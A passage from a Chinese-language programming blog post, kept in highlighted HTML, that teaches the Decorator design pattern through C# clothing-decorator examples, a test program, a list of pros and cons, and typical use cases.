punctuation">;</span>            <span class="token keyword">base</span><span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">BigTrouser</span> <span class="token punctuation">:</span> Finery    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"垮裤 "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">base</span><span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">Sneakers</span> <span class="token punctuation">:</span> Finery    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"破球鞋 "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">base</span><span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">Suit</span> <span class="token punctuation">:</span> Finery    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"西装 "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">base</span><span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">Tie</span> <span class="token punctuation">:</span> Finery    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"领带 "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">base</span><span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">LeatherShoes</span> <span class="token punctuation">:</span> Finery    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"皮鞋 "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">base</span><span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><p><strong>测试类</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token keyword">class</span> <span class="token class-name">Program</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Person xc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"小菜"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"\n第一种装扮："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Sneakers pqx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Sneakers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            BigTrouser kk <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigTrouser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            TShirts dtx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TShirts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//装饰过程          ---里氏替换原则</span>            pqx<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>xc<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">//破球鞋装扮</span>            kk<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>pqx<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">//跨库装扮</span>            dtx<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>kk<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">//大T衫装扮</span>            dtx<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                         <span class="token comment" spellcheck="true">//回调方法直至最底层</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"\n第二种装扮："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            LeatherShoes px <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LeatherShoes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                       Tie ld <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Tie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                        Suit xz <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Suit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                      <span class="token comment" spellcheck="true">//装饰过程</span>            px<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>xc<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">//皮鞋装扮 </span>            ld<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">//领带装扮</span>            xz<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>ld<span class="token punctuation">)</span><span class="token punctuation">;</span>                         <span class="token comment" spellcheck="true">//西装装扮</span>            xz<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"\n第三种装扮："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Sneakers pqx2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Sneakers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            LeatherShoes px2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LeatherShoes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            BigTrouser kk2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigTrouser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Tie ld2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Tie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//装饰过程</span>            pqx2<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>xc<span class="token punctuation">)</span><span class="token punctuation">;</span>            px2<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>pqx<span class="token punctuation">)</span><span class="token punctuation">;</span>            kk2<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>px2<span class="token punctuation">)</span><span class="token punctuation">;</span>            ld2<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>kk2<span class="token punctuation">)</span><span class="token punctuation">;</span>            ld2<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/装饰模式/装饰模式测试结果展示.png" alt="装饰模式测试结果展示"></center><h1 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h1><p><strong>优点</strong>：</p><ul><li>扩展对象功能，比继承灵活，不会导致类个数的急剧增加</li><li>可以对一个对象进行多次装饰，创造出不同行为的组合，得到功能更加强大的对象。</li><li>具体构建类和具体装饰类可以独立变化，用户可以根据需要自己增加新的具体构建子类和具体装饰子类。</li></ul><p><strong>缺点</strong>：</p><ul><li>产生很多小对象。大量小对象占据内存，一定程度上影响性能。</li><li>装饰模式容易出错，调试排查比较麻烦。</li></ul><h1 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h1><ol><li>IO中输入流和输出流的设计</li><li>Swing包中图形界面的构件功能</li><li>Servlet API中提供了一个request对象的Decorator设计模式的默认实现类HttpServletRequestWrapper, HttpServletRequestWrapper类，增强了request对象的功能。</li><li>Struts2 中，request，response，session对象的处理</li></ol><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>《大话设计模式》</li><li>《设计模式精解及面试攻略》</li></ul><h2 id="完整测试代码"><a href="#完整测试代码" class="headerlink" title="完整测试代码"></a>完整测试代码</h2><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> 装饰模式<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Program</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Person xc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"小菜"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"\n第一种装扮："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Sneakers pqx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Sneakers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            BigTrouser kk <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigTrouser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            TShirts dtx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TShirts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//装饰过程          ---里氏替换原则</span>            pqx<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>xc<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">//破球鞋装扮</span>            kk<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>pqx<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">//跨库装扮</span>            dtx<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>kk<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">//大T衫装扮</span>            dtx<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                         <span class="token comment" spellcheck="true">//回调方法直至最底层</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"\n第二种装扮："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            LeatherShoes px <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LeatherShoes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                       Tie ld <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Tie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                        Suit xz <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Suit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                      <span class="token comment" spellcheck="true">//装饰过程</span>            px<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>xc<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">//皮鞋装扮 </span>            ld<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">//领带装扮</span>            xz<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>ld<span class="token punctuation">)</span><span class="token punctuation">;</span>                         <span class="token comment" spellcheck="true">//西装装扮</span>            xz<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"\n第三种装扮："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Sneakers pqx2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Sneakers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            LeatherShoes px2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LeatherShoes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            BigTrouser kk2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigTrouser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Tie ld2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Tie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//装饰过程</span>            pqx2<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>xc<span class="token punctuation">)</span><span class="token punctuation">;</span>            px2<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>pqx<span class="token punctuation">)</span><span class="token punctuation">;</span>            kk2<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>px2<span class="token punctuation">)</span><span class="token punctuation">;</span>            ld2<span class="token punctuation">.</span><span class="token function">Decorate</span><span class="token punctuation">(</span>kk2<span class="token punctuation">)</span><span class="token punctuation">;</span>            ld2<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> Person类(ConcreteComponent)</span>    <span class="token keyword">class</span> <span class="token class-name">Person</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span> <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> name<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token keyword">string</span> name<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"装扮的{0}"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 服饰类(Decorator)</span>    <span class="token keyword">class</span> <span class="token class-name">Finery</span> <span class="token punctuation">:</span> Person    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> Person component<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//打扮</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Decorate</span><span class="token punctuation">(</span>Person component<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>component <span class="token operator">=</span> component<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//调用的是父类中的方法</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>component <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                component<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span>    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 具体服饰类(ConcreteDecorator)</span>    <span class="token keyword">class</span> <span class="token class-name">TShirts</span> <span class="token punctuation">:</span> Finery    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"大T恤 "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">base</span><span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">BigTrouser</span> <span class="token punctuation">:</span> Finery    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"垮裤 "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">base</span><span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">Sneakers</span> <span class="token punctuation">:</span> Finery    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"破球鞋 "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">base</span><span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">Suit</span> <span class="token punctuation">:</span> Finery    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"西装 "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">base</span><span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">Tie</span> <span class="token punctuation">:</span> Finery    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"领带 "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">base</span><span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">LeatherShoes</span> <span class="token punctuation">:</span> Finery    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"皮鞋 "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">base</span><span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span><span class="token punctuation">}</span></code></pre><h2 id="装饰模式-基本代码"><a href="#装饰模式-基本代码" class="headerlink" title="装饰模式-基本代码"></a>装饰模式-基本代码</h2><p><strong>抽象组件对象</strong></p><pre class=" language-csharp"><code class="language-csharp">    <span class="token comment" spellcheck="true">//对象的接口</span>    <span class="token comment" spellcheck="true">//可以为对象动态添加职责</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Component</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">void</span> <span class="token function">Operation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p><strong>具体组件对象</strong></p><pre class=" language-csharp"><code class="language-csharp">    <span class="token comment" spellcheck="true">//定义一个具体的对象</span>    <span class="token comment" spellcheck="true">//可以为该对象添加一些职责</span>    <span class="token keyword">class</span> <span class="token class-name">ConcreteComponent</span> <span class="token punctuation">:</span> Component    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Operation</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"具体对象的操作"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>装饰器对象</strong></p><pre class=" language-csharp"><code class="language-csharp">    <span class="token comment" spellcheck="true">//装饰抽象类</span>    <span class="token comment" spellcheck="true">//从外部扩展Component类对象的功能</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Decorator</span> <span class="token punctuation">:</span> Component    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> Component component<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">SetComponent</span><span class="token punctuation">(</span>Component component<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>component <span class="token operator">=</span> component<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Operation</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>component <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                component<span class="token punctuation">.</span><span class="token function">Operation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>具体装饰器对象</strong></p><pre class=" language-csharp"><code class="language-csharp">    <span class="token comment" spellcheck="true">//具体的装饰对象</span>    <span class="token comment" spellcheck="true">//为Component添加职责的功能</span>    <span class="token keyword">class</span> <span class="token class-name">ConcreteDecoratorA</span> <span class="token punctuation">:</span> Decorator    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> addedState<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Operation</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">base</span><span class="token punctuation">.</span><span class="token function">Operation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            addedState <span class="token operator">=</span> <span class="token string">"New State"</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"具体装饰对象A的操作"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//具体的装饰对象</span>    <span class="token comment" spellcheck="true">//为Component添加职责的功能</span>    <span class="token keyword">class</span> <span class="token class-name">ConcreteDecoratorB</span> <span class="token punctuation">:</span> Decorator    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Operation</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">base</span><span class="token punctuation">.</span><span class="token function">Operation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">AddedBehavior</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"具体装饰对象B的操作"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">AddedBehavior</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>测试类</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token keyword">class</span> <span class="token class-name">Program</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            ConcreteComponent c <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcreteComponent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            ConcreteDecoratorA d1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcreteDecoratorA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            ConcreteDecoratorB d2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcreteDecoratorB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            d1<span class="token punctuation">.</span><span class="token function">SetComponent</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>            d2<span class="token punctuation">.</span><span class="token function">SetComponent</span><span class="token punctuation">(</span>d1<span class="token punctuation">)</span><span class="token punctuation">;</span>            d2<span class="token punctuation">.</span><span class="token function">Operation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token 